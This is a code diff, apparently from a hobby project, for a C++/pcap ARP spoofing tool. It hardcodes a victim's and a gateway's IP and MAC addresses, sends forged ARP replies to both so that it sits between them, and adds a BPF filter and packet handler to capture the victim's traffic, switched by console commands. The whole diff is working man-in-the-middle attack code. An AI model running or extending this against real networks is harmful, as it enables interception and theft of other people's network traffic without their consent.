@@ -1,6 +1,7 @@
 #include "headers/AdapterQuery.h"
 #include "headers/net_structure.h"
 #include "headers/ARPSpoofing.h"
+#include "headers/PacketHandler.h"
 
 #include <iostream>
 
@@ -8,25 +9,47 @@ using std::cin, std::cout, std::endl;
 
 void packet_handler(u_char *param, const struct pcap_pkthdr *header, const u_char *pkt_data);
 
-#define EXPAND_MAC(A, B, C, D, E, F) {0x##A,0x##B,0x##C,0x##D,0x##E,0x##F}
-#define EXPAND_IP(A, B, C, D) {A,B,C,D}
+u_char target_ip[4] = IP(192, 168, 43, 171);
+u_char target_mac[6] = MAC(9c, b6, d0, b9, 1a, 0f);
 
-u_char target_ip[4] = EXPAND_IP(192, 168, 43, 171);
-u_char target_mac[6] = EXPAND_MAC(9c, b6, d0, b9, 1a, 0f);
+u_char gateway_ip[4] = IP(192, 168, 43, 1);
+u_char gateway_mac[6] = MAC(B0, EB, 57, 6E, C7, 58);
 
-u_char gateway_ip[4] = EXPAND_IP(192, 168, 43, 1);
-u_char gateway_mac[6] = EXPAND_MAC(B0, EB, 57, 6E, C7, 58);
+u_char self_ip[4] = IP(192, 168, 43, 215);
+u_char self_mac[6] = MAC(58, 91, CF, 98, 7B, FF);
 
-u_char self_ip[4] = EXPAND_IP(192, 168, 43, 215);
-u_char self_mac[6] = EXPAND_MAC(58, 91, CF, 98, 7B, FF);
-
-u_char broadcast_ip[4] = EXPAND_IP(0, 0, 0, 0);
-u_char broadcast_mac[6] = EXPAND_MAC(FF, FF, FF, FF, FF, FF);
+u_char broadcast_ip[4] = IP(0, 0, 0, 0);
+u_char broadcast_mac[6] = MAC(FF, FF, FF, FF, FF, FF);
 
 int main() {
     cout << "sizeof(arp_packet): " << sizeof(arp_packet) << endl;
     string dev_name = list_dev_and_choose_dev();
     pcap_t *adapter = open_adapter(dev_name);
+
+    char filter_buf[PCAP_ERRBUF_SIZE];
+    bpf_program bpf;
+    sprintf(filter_buf, "ip host %d.%d.%d.%d", EXPAND_IP(target_ip));
+
+#ifdef DEBUG
+    printf("filter buf: %s\n", filter_buf);
+#endif
+
+    // compile bpf filter
+    if (pcap_compile(adapter, &bpf, filter_buf,
+                     1, PCAP_NETMASK_UNKNOWN) < 0) {
+        pcap_perror(adapter, "Error occurred when "
+                             "compiling BPF filter: ");
+        pcap_close(adapter);
+        return -1;
+    }
+
+    // set bpf filter on adapter
+    if (pcap_setfilter(adapter, &bpf) < 0) {
+        pcap_perror(adapter, "Error occurred when "
+                             "setting BPF filter");
+        pcap_close(adapter);
+        return -1;
+    }
 
     arp_packet *spoofing_target_packet = arp_packet_constructor(gateway_ip, self_mac,
                                                                 target_ip, target_mac);
@@ -36,21 +59,33 @@ int main() {
                                                                  target_ip, target_mac);
     ARP_packet_sender gateway_spoofer(adapter, spoofing_gateway_packet, 1000);
 
+    // TODO: Add ARP recovering
 
-    char ch;
-    while (cin >> ch) {
-        if (ch == '1') {
+    PacketHandler pkt_h(adapter, target_ip);
+
+    string cmd;
+    while (cin >> cmd) {
+        if (cmd == "spoofer_on") {
             target_spoofer.start();
             gateway_spoofer.start();
         }
-        if (ch == '2') {
+        if (cmd == "spoofer_off") {
             target_spoofer.stop();
             gateway_spoofer.stop();
         }
-        if (ch == '4') {
+        if (cmd == "exit") {
             target_spoofer.stop();
             gateway_spoofer.stop();
+            pkt_h.stop();
+            pkt_h.stop();
+            pcap_close(adapter);
             return 0;
+        }
+        if (cmd == "pkth_on") {
+            pkt_h.start();
+        }
+        if (cmd == "pkth_off") {
+            pkt_h.stop();
         }
     }
 
